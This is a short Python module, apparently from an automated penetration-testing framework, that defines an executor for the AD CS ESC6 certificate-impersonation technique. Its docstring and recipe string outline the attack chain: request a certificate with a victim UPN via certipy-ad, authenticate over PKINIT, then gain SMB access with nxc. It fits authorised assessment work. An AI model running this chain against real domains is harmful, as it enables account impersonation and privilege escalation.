"""ADCS-ESC6: CA EDITF_ATTRIBUTESUBJECTALTNAME2 permits the requested SAN/UPN.

Use ``req -upn <impersonate>`` on an authentication template that normally
forbids requester-supplied SAN, then auth (PKINIT) and nxc ticket-backed access.
UNVERIFIED ASSUMPTION: the CA flag and certificate mapping configuration permit
this recipe. ESC1's req/auth markers (documented in ``_adcs_request_common``)
are unverified here. Issuance without successful use never proves escalation.
Rollback destroys the issued PFX and cache; no CA setting is changed.
"""
from ._adcs_request_common import ADCSRequestExecutor


class ADCSESC6Executor(ADCSRequestExecutor):
    technique = "ADCS-ESC6"
    template_default = "User"
    template_description = "Authentication template normally forbidding requester-supplied SAN."
    recipe_ref = ("UNVERIFIED ADCS-ESC6: CA EDITF_ATTRIBUTESUBJECTALTNAME2; "
                  "certipy-ad req -template <User> -upn <victim> -> auth (PKINIT) "
                  "-> nxc smb -k; verified key-material destruction")
